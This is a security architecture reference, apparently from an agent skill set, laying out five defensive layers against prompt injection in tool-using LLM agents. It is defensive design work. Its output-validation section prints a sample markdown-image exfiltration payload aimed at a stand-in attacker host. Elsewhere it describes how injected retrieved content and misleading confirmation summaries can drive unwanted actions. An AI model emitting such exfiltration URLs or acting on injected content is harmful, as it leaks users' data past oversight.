# LLM Defense in Depth — 5-Layer Reference

Architectural reference for systems that put an LLM behind a tool surface (CourierFlow Charlie, any agent that calls services, any LLM endpoint that renders user-supplied content). Adapted from ToxSec, "LLM Defense in Depth: Assume Breach and Contain the Blast" (2026-05).

## The premise

Prompt injection (OWASP LLM01:2025) cannot be reliably prevented at the input layer — input filters and safety training are probabilistic. Defense-in-depth pairs probabilistic *speed bumps* with deterministic *blast doors* that contain damage when a probabilistic layer fails. The system is designed assuming injection will succeed; the question is what it can reach.

## The 5 layers

### 1. Provenance tagging

Every piece of content the model sees carries a label: `system`, `user`, `rag`, `tool_output`, `external`. The runtime uses the label to decide what tool calls (if any) are allowed from content that originated there.

**Concrete rule:** content tagged `rag` or `external` cannot trigger a tool call that mutates state (send SMS, write DB, call payment API). It can read, summarize, and reason — it cannot act.

**Why:** prompt injection in a retrieved document or an external page should not become an authenticated action by the agent.

**Anti-pattern:** treating retrieved-document text as system-trusted because it lives in your vector DB. Anything an attacker can write into is `external`.

### 2. Least privilege (per-channel scoping)

Every API token, DB connection, and service credential the agent uses is scoped to the smallest possible surface. The agent's runtime token cannot:

- Read tables it doesn't need (`SELECT` allowlisted).
- Call services outside its allowed list.
- Cross tenant boundaries (`user_id` enforced in every query).

**Concrete rule:** the agent does NOT get the platform admin token. It gets a per-tenant, per-action-class token rotated frequently.

**Anti-pattern (specific to CourierFlow):** sharing a top-level `Anthropic` API key across all tenant calls — one prompt-injection-driven exfil reaches every tenant. Per-tenant subkeys (or a scoped backend that the agent calls) is the structural fix.

### 3. Output validation

Before the model's output reaches a renderer or a tool call, validate it deterministically:

- **Markdown image exfiltration:** `![x](https://attacker.example/leak?data=...)` — strip or domain-allowlist all image URLs in chat output. Same for link hrefs.
- **HTML/JS escape:** any model output rendered into a DOM is `xml_escape`-ed before injection.
- **JSON shape:** tool-call payloads must validate against the tool's input schema before dispatch. Schema-failed calls are rejected, not retried.

**Why:** the most common real-world exfil channel is not "the model said the password" — it's "the model embedded the password in an image URL that fired on render."

**See also:** the `Escape XML/TwiML Substitutions` and `LLM Prompt Injection (User Content)` rows in the main `SKILL.md` Quick Reference.

### 4. Human-in-the-loop (HITL) for sensitive actions

State-changing actions above an autonomy threshold require explicit user confirmation. The HITL prompt itself is treated as untrusted — the model's framing of *what it's asking for* must be reconstructed from the underlying action, not quoted from the model.

**Concrete rule:** the confirmation UI does NOT render the model's natural-language summary of the action. It renders a structured representation generated from the tool call's typed arguments. (Model says "send a friendly reminder"; UI says "Send SMS to +1-555-… with body: «Your rent is due Friday.»")

**Anti-pattern:** "Are you sure you want to: `{model_summary}`?" — a malicious model can summarize a state-mutating call as a benign read.

### 5. Application-layer monitoring

The runtime emits per-turn telemetry on tool-call frequency, model-output entropy, denied actions, and provenance-tag flows. Deviations alert.

**Concrete signals worth alerting on:**
- Sudden spike in `external`-provenance content immediately followed by attempted tool calls.
- The model attempting tool calls outside its allowed list (denials should be rare; a burst means something flipped).
- Output containing URLs not on the domain allowlist.
- A jump in `tool_retries` per turn — model is being coerced.

## Containment strategies (cross-cutting)

- **Credential isolation:** API keys and DB passwords are NEVER in the model's context window. They live in the runtime; the runtime substitutes them at tool-call time. The model knows tool names, not secrets.
- **Tool sandboxing:** tools that touch the filesystem or shell run in a process with a restricted FS view and no network egress except to allowlisted hosts.
- **Session isolation:** one tenant's session state cannot leak into another's. No global caches keyed on shared identifiers.

## How to use this reference

1. **When designing a new agent surface:** walk the 5 layers explicitly in the design doc. Each layer either has an implementation or a documented "deferred because X" note.
2. **When reviewing an existing surface:** pick a layer per review pass — easier than auditing all 5 at once.
3. **When triaging an injection incident:** the layer that failed tells you the structural fix. Don't patch the prompt — strengthen the layer.

## Pairs with the main SKILL.md

The 5-layer model is architectural; the SKILL.md Quick Reference rows are specific anti-patterns. Use this file to decide which layer to harden; use the Quick Reference to find the specific check inside that layer.

| Layer | Related Quick Reference rows |
|---|---|
| 1 — Provenance tagging | `LLM Prompt Injection (User Content)` |
| 2 — Least privilege | `Fail-Closed Webhook Validators`, `Subprocess Shell Injection` |
| 3 — Output validation | `Escape XML/TwiML Substitutions`, `Context-Aware Sanitizers`, `Error Leaking` |
| 4 — HITL | `HITL Confirmation Trust` |
| 5 — Monitoring | `Telemetry Fail-Open` |

The HITL row was backfilled directly from Layer 4 alongside this file's introduction — it does not wait for a CourierFlow incident because the anti-pattern (rendering `{model_summary}` in the confirmation UI) is structural, not incident-derived.
